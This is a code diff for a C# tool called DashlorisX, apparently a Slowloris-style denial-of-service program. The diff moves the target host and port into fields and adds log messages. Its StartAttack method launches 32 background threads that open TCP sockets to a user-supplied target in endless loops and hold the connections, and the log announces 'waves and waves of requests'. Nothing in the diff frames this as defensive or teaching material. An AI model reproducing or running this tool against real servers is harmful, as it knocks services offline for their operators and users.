@@ -69,14 +69,14 @@ namespace DashlorisX
 
 	readonly List<Socket> longSocks = new List<Socket>();
 
+	string host = string.Empty;
+	string port = string.Empty;
+
 	private void SendHeader(Socket longSock)
 	{   
-	    var host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
-	    var port = DashNet.GetPort(DashlorisX.PortTextBox.Text);
-
 	    try//Multi thread this
 	    {
-		var result = longSock.BeginConnect(host, port, null, null);
+		var result = longSock.BeginConnect(host, DashNet.GetInteger(port), null, null);
 		var success = result.AsyncWaitHandle.WaitOne(500, true);
 
 		longSock.Ttl = 255;
@@ -117,41 +117,61 @@ namespace DashlorisX
 	private Socket GetSocket() =>
 	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
+	void LogSend(string text)
+	{
+	    LogLog.TextLog.AppendText($"{text}\r\n");
+	}
+
 	public void StartAttack()
 	{
-	    for (int k = 0; k < 32; k += 1)//worker integration
+	    host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
+	    port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();
+
+	    LogSend("Starting workers ....");
+
+	    workers.Add(new Thread(() =>
 	    {
-		workers.Add(new Thread(() =>
+		for (int k = 0; k < 32; k += 1)//worker integration
 		{
-		    while (true)
+		    workers.Add(new Thread(() =>
 		    {
-			for (int request = 0; request < 64; request += 1)
+			while (true)
 			{
-			    for (int multiplier = 0; multiplier < 4; multiplier += 1)
+			    for (int request = 0; request < 64; request += 1)
 			    {
-				SendHeader(GetSocket());
+				for (int multiplier = 0; multiplier < 2; multiplier += 1)
+				{
+				    SendHeader(GetSocket());
+				}
+
+				Thread.Sleep(2000);//inner interval integration
 			    }
 
-			    Thread.Sleep(1000);
+			    Thread.Sleep(8000);//interval integration
 			}
+		    }));
 
-			Thread.Sleep(8000);
-		    }
-		}));
+		    workers[workers.Count - 1].IsBackground = true;
+		    workers[workers.Count - 1].Start();
+		}
+	    }));
 
-		workers[workers.Count - 1].IsBackground = true;
-		workers[workers.Count - 1].Start();
-	    }
+	    workers[workers.Count - 1].IsBackground = true;
+	    workers[workers.Count - 1].Start();
+	    
+	    LogSend("Sending waves and waves of requests ....");
 
 	    StartTimer();
-	    
+
 	    LogLog.ShowDialog();
 	}
 
 	public void StopAttack()
 	{
 	    DashlorisX.Launch.Text = "Stopping ....";
-	    
+
+	    LogSend("Stop signal received, stopping ....");
+
 	    try//10.0.2.15
 	    {
 		foreach (Socket longSock in longSocks)
